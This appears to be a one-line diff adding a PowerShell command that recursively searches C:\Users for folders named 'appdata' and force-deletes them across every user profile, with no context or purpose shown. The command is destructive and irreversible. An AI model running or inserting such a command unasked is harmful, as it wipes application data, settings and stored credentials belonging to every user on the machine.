@@ -1,0 +1,1 @@
+Get-ChildItem -path "C:\Users" -Include 'appdata' -Recurse -force | Remove-Item -force -Recurse
